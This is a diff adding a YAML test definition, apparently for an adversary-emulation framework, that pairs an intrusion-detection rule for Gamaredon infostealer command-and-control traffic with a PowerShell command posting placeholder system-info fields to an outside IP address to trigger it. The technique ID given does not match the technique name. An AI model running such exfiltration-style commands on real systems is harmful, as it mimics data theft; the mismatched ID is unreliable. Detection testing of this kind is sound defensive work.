@@ -1,0 +1,40 @@
+- tactic: command-and-control
+  technique_name: 'Application Layer Protocol: Web Protocols'
+  technique_id: T1070.001
+  name: 'Intrusion: Gamaredon CNC Win Infostealer'
+  description: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:"MALWARE-CNC
+    Win.Infostealer.Gamaredon outbound connection attempt"; flow:to_server,established;
+    http_uri; content:"/info.php",nocase; http_client_body; content:"name=",nocase;
+    content:"img=iVBORw0K",fast_pattern,nocase; content:"sysinfo=",nocase; content:"share=",nocase;
+    content:"install=",nocase; content:"desktop=",nocase; metadata:impact_flag red,policy
+    balanced-ips drop,policy max-detect-ips drop,policy security-ips drop; service:http;
+    classtype:trojan-activity; gid:1; sid:62740; rev:1; )
+  executors:
+  - name: psh
+    platform: windows
+    command: 'Invoke-WebRequest -Uri "http://198.18.128.192/info.php" -Method POST
+      -Body "name=testuser&img=iVBORw0K&sysinfo=example_sysinfo&share=testshare&install=testinstall&desktop=testdesktop"
+      -Headers @{ "Content-Type" = "application/x-www-form-urlencoded" }
+
+      '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - command-and-control
+  additional_info: {}
+  access: {}
+  singleton: true
+  plugin: ''
+  delete_payload: false
+  id: 92ec128f-ae8d-41cb-9e28-0a65960bea22
